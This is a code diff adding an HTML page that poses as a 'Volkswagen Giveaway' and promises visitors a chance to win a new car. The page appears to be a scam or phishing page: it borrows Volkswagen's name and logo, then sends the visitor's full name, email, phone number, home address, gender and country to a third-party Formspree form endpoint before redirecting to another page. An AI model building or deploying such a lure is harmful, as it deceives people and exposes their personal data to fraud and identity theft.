@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Volkswagen Giveaway</title>
+
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family:Arial, sans-serif;
+        }
+
+        body{
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            background:
+            linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)),
+            url('background.jpg');
+            background-size:cover;
+            background-position:center;
+            padding:20px;
+        }
+
+        .container{
+            width:100%;
+            max-width:430px;
+            background:rgba(255,255,255,0.96);
+            border-radius:25px;
+            padding:30px 25px;
+            box-shadow:0 10px 35px rgba(0,0,0,0.35);
+            animation:fadeIn 0.8s ease;
+        }
+
+        @keyframes fadeIn{
+            from{
+                opacity:0;
+                transform:translateY(20px);
+            }
+            to{
+                opacity:1;
+                transform:translateY(0);
+            }
+        }
+
+        .logo{
+            text-align:center;
+            margin-bottom:15px;
+        }
+
+        .logo img{
+            width:100px;
+            height:100px;
+            object-fit:contain;
+            border-radius:50%;
+            background:#fff;
+            padding:8px;
+            box-shadow:0 5px 15px rgba(0,0,0,0.15);
+        }
+
+        h1{
+            text-align:center;
+            color:#001d4a;
+            font-size:34px;
+            margin-top:10px;
+            margin-bottom:8px;
+        }
+
+        .sub-text{
+            text-align:center;
+            color:#444;
+            margin-bottom:25px;
+            font-size:15px;
+            line-height:1.5;
+        }
+
+        .highlight{
+            color:#0b57d0;
+            font-weight:bold;
+        }
+
+        .badge{
+            display:inline-block;
+            background:#eaf2ff;
+            color:#0b57d0;
+            padding:8px 15px;
+            border-radius:20px;
+            font-size:13px;
+            margin-bottom:15px;
+            font-weight:bold;
+        }
+
+        .input-box{
+            margin-bottom:16px;
+        }
+
+        .input-box input,
+        .input-box select{
+            width:100%;
+            padding:15px;
+            border-radius:12px;
+            border:1px solid #ccc;
+            font-size:15px;
+            outline:none;
+            background:#f8f8f8;
+            transition:0.3s;
+        }
+
+        .input-box input:focus,
+        .input-box select:focus{
+            border-color:#0b57d0;
+            background:#fff;
+            box-shadow:0 0 10px rgba(11,87,208,0.2);
+        }
+
+        .btn{
+            width:100%;
+            padding:15px;
+            border:none;
+            border-radius:12px;
+            background:linear-gradient(to right,#001d4a,#0b57d0);
+            color:white;
+            font-size:17px;
+            font-weight:bold;
+            cursor:pointer;
+            transition:0.3s;
+            margin-top:10px;
+        }
+
+        .btn:hover{
+            transform:scale(1.02);
+        }
+
+        .footer{
+            text-align:center;
+            margin-top:20px;
+            font-size:13px;
+            color:#666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <div class="logo">
+            <img src="logo.jpg" alt="Volkswagen Logo">
+        </div>
+
+        <center>
+            <div class="badge">
+                LIMITED GIVEAWAY EVENT
+            </div>
+        </center>
+
+        <h1>Win a Brand New Car 🚗</h1>
+
+        <p class="sub-text">
+            Register below for a chance to drive home a
+            <span class="highlight">brand new Volkswagen</span>.
+        </p>
+
+        <!-- FORM -->
+        <form action="https://formspree.io/f/xdajdvnp"
+              method="POST"
+              onsubmit="redirectPage()">
+
+            <div class="input-box">
+                <input type="text"
+                       name="Full Name"
+                       placeholder="Full Name"
+                       required>
+            </div>
+
+            <div class="input-box">
+                <input type="email"
+                       name="Email Address"
+                       placeholder="Email Address"
+                       required>
+            </div>
+
+            <div class="input-box">
+                <input type="tel"
+                       name="Phone Number"
+                       placeholder="Phone Number"
+                       required>
+            </div>
+
+            <div class="input-box">
+                <input type="text"
+                       name="Home Address"
+                       placeholder="Home Address"
+                       required>
+            </div>
+
+            <div class="input-box">
+                <select name="Gender" required>
+                    <option value="">Select Gender</option>
+                    <option>Male</option>
+                    <option>Female</option>
+                </select>
+            </div>
+
+            <div class="input-box">
+                <select name="Country" required>
+                    <option value="">Select Country</option>
+                    <option>Canada</option>
+                    <option>Germany</option>
+                    <option>South Africa</option>
+                    <option>United states</option>
+                </select>
+            </div>
+
+            <button type="submit" class="btn">
+                Register Now
+            </button>
+
+        </form>
+
+        <div class="footer">
+            ©️ 2026 Volkswagen Giveaway Campaign
+        </div>
+
+    </div>
+
+    <script>
+        function redirectPage(){
+
+            setTimeout(() => {
+                window.location.href = "registration.html";
+            }, 1000);
+
+        }
+    </script>
+
+</body>
+</html>
